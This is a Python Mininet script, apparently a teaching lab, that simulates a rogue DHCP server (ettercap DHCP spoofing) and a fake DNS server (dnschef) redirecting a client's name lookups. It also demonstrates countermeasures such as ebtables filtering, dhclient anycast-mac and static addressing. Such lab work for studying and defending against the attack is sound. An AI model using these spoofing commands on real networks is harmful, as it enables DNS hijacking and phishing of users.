#!/usr/bin/python2
#
# An evil host near the client in the network tries to respond
# to DHCP requests faster than the real DHCP server and point
# hosts to its own DNS server allowing it to point people to
# phishing sites.
#
# Based on:
#   https://bitbucket.org/lantz/cs144-dhcp/raw/master/dhcp.py
#
# Dependencies:
#   busybox (provides udhcd)
#   dhclient
#   dnsmasq
#   ettercap
#   iptables
#   ebtables
#
# Software used for which tasks:
#    busybox udhcd - the normal DHCP server
#    dhclient - the DHCP client
#    dnsmasq - the DNS server commonly used for caching on routers
#    ettercap - the tool to spoof the real DHCP ACK
#    dnschef - Python DNS server pointed to by spoofed DHCP
#    iptables - filter packets at the network layer
#    ebtables - filter packets at the link layer
#
# Note: in all likelyhood, this won't work on another Linux distribution
# without some modification. For example, you'll need to change 'python2' to
# be just 'python'. You might have to use OVSBridge instead of LinuxBridge
# if `mn --switch lxbr --test pingall' drops all your pings.

# Future work
#   - mark in ebtables, act on mark in userspace
#   - block spoofing of server's IP by looking at MAC with ebtables
#   - see if making the evil host the gateway allows more packet sniffing
#

import os
import sys
import time
import shutil
from mininet.net import Mininet
from mininet.topo import Topo
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.nodelib import LinuxBridge
from nat import connectToInternet, stopNAT

# Is network manager running?
def isNetworkManagerRunning():
    return os.system("pgrep NetworkManager &>/dev/null") == 0

# Topology:
#   client - switch - switch - DHCP server
#              |
#            attacker
class DHCPTopo(Topo):
    def __init__(self, *args, **kwargs):
        Topo.__init__(self, *args, **kwargs)

        # Make sure that these are private mounts in only the desired process,
        # so we don't end up hiding /etc and /var for the duration of this
        # program. To make it private, it must be mounted, so bind it to itself
        # and then make it private.
        os.system('mount --bind /etc /etc')
        os.system('mount --make-rprivate /etc')
        os.system('mount --bind /var /var')
        os.system('mount --make-rprivate /var')

        # Private directories for client
        self.client_etc = '/tmp/etc-client'
        self.client_var = '/tmp/var-client'
        self.createDirs([self.client_etc, self.client_var])
        private = [('/etc', self.client_etc), ('/var', self.client_var)]

        # inNamespace is needed so that we get a private network and mount
        # namespace for processes run on this host
        client = self.addHost('h1',
                ip='10.0.0.10/24',
                privateDirs=private,
                inNamespace=True)

        # The rest don't need any special setup
        switch1 = self.addSwitch('s1')
        switch2 = self.addSwitch('s2')
        dhcp = self.addHost('dhcp', ip='10.0.0.50/24')
        evil = self.addHost('evil', ip='10.0.0.66/24')
        self.addLink(client, switch1)
        self.addLink(evil, switch1)
        self.addLink(dhcp, switch2)
        self.addLink(switch1, switch2)

    def __enter__(self):
        return self

    def __exit__(self, type, value, traceback):
        shutil.rmtree(self.client_etc)
        shutil.rmtree(self.client_var)

        # Try to reduce the number in /proc/mounts, but if something is running
        # in one of these, then it won't unmount. It doesn't really matter
        # since we just mounted it to itself.
        os.system('umount /etc &>/dev/null')
        os.system('umount /var &>/dev/null')

    # Create a list of directories
    def createDirs(self, dirs):
        for d in dirs:
            try:
                os.makedirs(d)
            except OSError:
                pass

# DHCP server functions and data
DHCPTemplate = """
start		10.0.0.10
end		10.0.0.90
option	subnet	255.255.255.0
option	domain	local
option	lease	7  # seconds
"""

# Output network addresses and names for assisting in Wireshark analysis
def outputNet(l):
    for h in l:
        print "Host:", h.name, "IP:", h.IP(), "MAC:", h.MAC()

# We need a separate /etc/resolv.conf for each host so that they can
# resolve DNS names with the DNS server they received from DHCP. Might as
# well also not mess up the real udhcpd or dhclient lease files, especially
# when they might actually be in use on the real host.
def setupPrivateFS(host, etc, var):
    host.cmd('touch ', etc + '/resolv.conf')
    host.cmd('mkdir -p', var + '/lib/misc')
    host.cmd('mkdir -p', var + '/lib/dhclient')
    host.cmd('mkdir -p', var + '/run')
    host.cmd('touch ', var + '/lib/misc/udhcpd.leases')
    host.cmd('touch ', var + '/lib/dhclient/dhclient.leases')

# Output when we get an IP from the DHCP server
def waitForIP(host):
    info('*', host, 'waiting for IP address')
    while True:
        host.defaultIntf().updateIP()
        if host.IP():
            break
        info('.')
        time.sleep(1)
    info('\n')
    info('*', host, 'is now at',host.IP(),'and is using',
          host.cmd('grep nameserver /etc/resolv.conf'))
    info('\n')

# DHCP Client
def startDHCPclient(host):
    intf = host.defaultIntf()
    host.cmd('touch /tmp/dhclient.conf', intf)
    host.cmd('dhclient -v -d -r', intf)
    host.cmd('dhclient -v -d -cf /tmp/dhclient.conf ' \
            '1> /tmp/dhclient.log 2>&1', intf, '&')

def stopDHCPclient(host):
    host.cmd('kill %dhclient')
    host.cmd('rm /tmp/dhclient.log')
    host.cmd('rm /tmp/dhclient.conf')

# Good DHCP Server
def makeDHCPconfig(filename, intf, gw, dns):
    config = (
        'interface %s' % intf,
        DHCPTemplate,
        'option router %s' % gw,
        'option dns %s' % dns,
        '')
    with open(filename, 'w') as f:
        f.write('\n'.join(config))

def cleanDHCPconfig(host, filename):
    host.cmd('rm ', filename)

def startGoodDHCPserver(host, gw, dns):
    info('* Starting good DHCP server on', host, 'at', host.IP(), '\n')
    dhcpConfig = '/tmp/%s-udhcpd.conf' % host
    makeDHCPconfig(dhcpConfig, host.defaultIntf(), gw, dns)
    host.cmd('busybox udhcpd -f', dhcpConfig,
              '1>/tmp/%s-dhcp.log 2>&1  &' % host)

def stopGoodDHCPserver(host):
    info('* Stopping good DHCP server on', host, 'at', host.IP(), '\n')
    host.cmd('kill %udhcpd')
    dhcpConfig = '/tmp/%s-udhcpd.conf' % host
    cleanDHCPconfig(host, dhcpConfig)

# Bad DHCP Server
def startBadDHCPserver(host, gw, dns):
    info('* Starting bad DHCP server on', host, 'at', host.IP(), '\n')
    host.cmd('ettercap -T -M dhcp:10.0.0.10-90/255.255.255.0/%s ' \
            '-a etter.conf &>/tmp/ettercap.log &' % host.IP())

def stopBadDHCPserver(host):
    info('* Stopping bad DHCP server on', host, 'at', host.IP(), '\n')
    host.cmd('kill %ettercap')
    host.cmd('rm /tmp/ettercap.log')

# Yersinia doesn't appear to execute DHCP attack from the daemon
#def startBadDHCPserver(host, gw, dns):
#    info('* Starting bad DHCP server on', host, 'at', host.IP(), '\n')
#    host.cmd('yersinia -D')
#    host.cmd('expect setup_yersinia localhost 12000 %s %s 10.0.0.10 ' \
#            '10.0.0.90 7 10 255.255.255.0 local &>/tmp/yersinia.log &'
#            % (host.defaultIntf(), host.IP()))
#
#def stopBadDHCPserver(host):
#    info('* Stopping bad DHCP server on', host, 'at', host.IP(), '\n')
#    host.cmd('killall yersinia')
#    host.cmd('rm /tmp/yersinia.log')

# Good DNS Server
def startGoodDNSserver(host):
    info('* Starting good DNS server', host, 'at', host.IP(), '\n')
    host.cmd('dnsmasq -k -x /tmp/dnsmasq.pid -C - ' \
            '1>/tmp/dns-good.log 2>&1 </dev/null &')

def stopGoodDNSserver(host):
    info('* Stopping good DNS server', host, 'at', host.IP(), '\n')
    host.cmd('kill $(cat /tmp/dnsmasq.pid)')
    host.cmd('rm /tmp/dns-good.log')
    host.cmd('rm /tmp/dnsmasq.pid')

# Bad DNS Server
def startBadDNSserver(host):
    info('* Starting bad DNS server', host, 'at', host.IP(), '\n')
    host.cmd('python2 dnschef.py --file=dnschef.ini -i ' \
            '10.0.0.66 1>/tmp/dns-bad.log 2>&1 &')

def stopBadDNSserver(host):
    info('* Stopping bad DNS server', host, 'at', host.IP(), '\n')
    host.cmd('kill %dnschef')
    host.cmd('rm /tmp/dns-bad.log')

# Prevent this attack from being possible
#
# Filter out all DHCP ACKs and Offers coming from the wrong MAC address
def startSwitchBlocking(host, realMAC):
    info('* Starting DHCP blocking on', host, 'at', host.IP(),
            'all but from', realMAC, '\n')
    host.cmd('ebtables -I FORWARD -s \! %s --protocol ipv4 --ip-proto udp ' \
            '--ip-dport 68 -j DROP' % realMAC)

def stopSwitchBlocking(host):
    host.cmd('ebtables -F')

# Instead of just blocking DHCP packets from the wrong MAC, detect those and
# then attack the evil server
def startSwitchCounterattack(host, realMAC):
    pass
    # not finished...

def stopSwitchCounterattack(host):
    pass

# Create a config file before running dhclient that'll specify the MAC address
# of the real DHCP server so that the evil one won't even receive the packets
# alerting it that somebody is connecting. It does receive the real DHCP server's
# offer and ACK, but since those are going to FF:FF:FF:FF:FF:FF, ettercap doesn't
# know the MAC of the connecting client, so it can't spoof the ACK.
def clientBlockingConfig(host, realMAC):
    config = (
        'interface "%s" {' % host.defaultIntf(),
        'anycast-mac ethernet %s;' % realMAC,
        '}',
        '')
    with open('/tmp/dhclient.conf', 'w') as f:
        f.write('\n'.join(config))

# Resolve the problem by not even using DHCP and instead just assigning a
# static IP and manually setting up the gateway and subnet mask.
def setupStaticIP(host, ip, mask, gw, dns):
    # Setup static IP and gateway, the subnet route is automatically added when
    # you specify the subnet mask
    host.cmd('ip addr add %s/%s dev %s' % (ip, mask, host.defaultIntf()))
    host.cmd('ip route add default via %s metric 100 dev %s' % \
            (gw, host.defaultIntf()))

    # Tell it which DNS server to use. We can't actually use python to do this
    # since we need to create the file in the process that has a private /etc
    # mounted.
    host.cmd('echo "nameserver %s" > /etc/resolv.conf' % dns)

def usage():
    print """Usage: python2 dhcp_spoof.py interface [preventionTechnique]

Interface:
    the interface on which to get Internet access, e.g. eth0

Prevention Technique:
    0 - none, allow the attack to happen (default)
    1 - ebtables blocking all but correct DHCP packets
    2 - dhclient anycast-mac
    3 - static IP

Not yet implemented:
    4 - counter attack, DHCP starve the attacker
    5 - ebtables block IP spoofing by looking at MAC
    6 - use snort (IPS) on switch to detect attacker
"""

if __name__ == '__main__':
    setLogLevel('info')

    # Parse arguments
    if len(sys.argv) == 2:
        inetIntf = sys.argv[1]
        prevent = 0
    elif len(sys.argv) == 3:
        inetIntf = sys.argv[1]
        prevent = int(sys.argv[2])

        if prevent < 0 or prevent > 6:
            print "Error: invalid technique number"
            sys.exit(1)
        elif prevent > 3:
            print "Error: technique not yet implemented"
            sys.exit(1)
    else:
        usage()
        sys.exit(1)

    # Setup the virtualized attack
    with DHCPTopo() as topo:
        net = Mininet(topo=topo, link=TCLink, switch=LinuxBridge,
                controller=None, autoSetMacs=True)
        h1, dhcp, evil, switch = net.get('h1', 'dhcp', 'evil', 's1')
        setupPrivateFS(h1, topo.client_etc, topo.client_var)
        rootnode = connectToInternet(net, inetIntf, 's1')

        try:
            raw_input("Press return after you've started wireshark on s1")

            if prevent == 2:
                clientBlockingConfig(h1, dhcp.MAC())

            # Set up a good DHCP and DNS server
            startGoodDHCPserver(dhcp, gw=rootnode.IP(), dns=dhcp.IP())
            startGoodDNSserver(dhcp)

            if prevent == 1:
                startSwitchBlocking(switch, dhcp.MAC())
            elif prevent == 4:
                startSwitchCouterattack(switch, dhcp.MAC())

            # Start up evil DHCP and DNS server
            startBadDHCPserver(evil, gw=rootnode.IP(), dns=evil.IP())
            startBadDNSserver(evil)
            h1.cmd('ifconfig', h1.defaultIntf(), '0')

            if prevent == 3:
                # We don't have to use DHCP if we already know a configuration
                setupStaticIP(h1, h1.IP(), 8, rootnode.IP(), dhcp.IP())
            else:
                # Wait for ettercap to find the hosts
                time.sleep(4)

                # Let the client connect
                startDHCPclient(h1)
                waitForIP(h1)

            # Try to ping Google from the client
            print "Pinging google.com"
            h1.cmdPrint('ping -c 1 -w 1 google.com')

            # Output the network
            outputNet([h1, dhcp, evil])
            print

            # Debug
            print "Dropping to CLI, exit to cleanup virtual network."
            CLI(net)

        except KeyboardInterrupt:
            print
            print "Exiting..."

        finally:
            # Clean up everything
            if prevent == 1:
                stopSwitchBlocking(switch)
            elif prevent == 4:
                stopSwitchCounterattack(switch)

            stopBadDNSserver(evil)
            stopBadDHCPserver(evil)
            stopGoodDNSserver(dhcp)
            stopGoodDHCPserver(dhcp)
            stopDHCPclient(h1)
            stopNAT(rootnode)
            net.stop()
